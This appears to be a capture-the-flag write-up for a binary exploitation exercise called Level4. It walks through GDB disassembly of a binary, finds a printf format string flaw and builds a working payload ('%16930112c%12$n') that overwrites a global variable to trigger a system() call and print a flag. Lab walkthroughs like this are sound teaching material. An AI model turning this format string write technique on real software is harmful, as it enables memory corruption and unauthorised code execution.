# Level4

First step - testing the program
```
$ ./level4
Hello
Hello
```
The program wait an input and print it

Start it in GDB
```
(gdb-peda)$ disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:		push   ebp
   0x080484a8 <+1>:		mov    ebp,esp
   0x080484aa <+3>:		and    esp,0xfffffff0
   0x080484ad <+6>:		call   0x8048457 <n>
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.
```
The main call a function `n`
```
(gdb-peda)$ disas n
Dump of assembler code for function n:
   0x08048457 <+0>:		push   ebp
   0x08048458 <+1>:		mov    ebp,esp
   0x0804845a <+3>:		sub    esp,0x218
   0x08048460 <+9>:		mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.
```

3 things here : a `fgets` call, a call to a `p` function, and a condition for a call to `system`
```
(gdb-peda)$ disas p
Dump of assembler code for function p:
   0x08048444 <+0>:		push   ebp
   0x08048445 <+1>:		mov    ebp,esp
   0x08048447 <+3>:		sub    esp,0x18
   0x0804844a <+6>:		mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:		mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.
```

---


So, 2 things here : We have format string printf exploit and we need to **m** global variable be equal to 0x1025544 (16930116)


First step find the position of our buffer
```
$ python -c 'print "AAAABBBB"+" %x"*15' | ./level4
AAAABBBB b7ff26b0 bffff684 b7fd0ff4 0 0 bffff648 804848d bffff440 200 b7fd1ac0 b7ff37d0 41414141 42424242 20782520 25207825
```
It is 12th position.

**m** address is "0x8049810"

Let's start :

```
echo `python -c 'print("\x10\x98\x04\x08" + "%16930112c"  + "%12$n")'` > payload

cat payload  | ./level4


0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
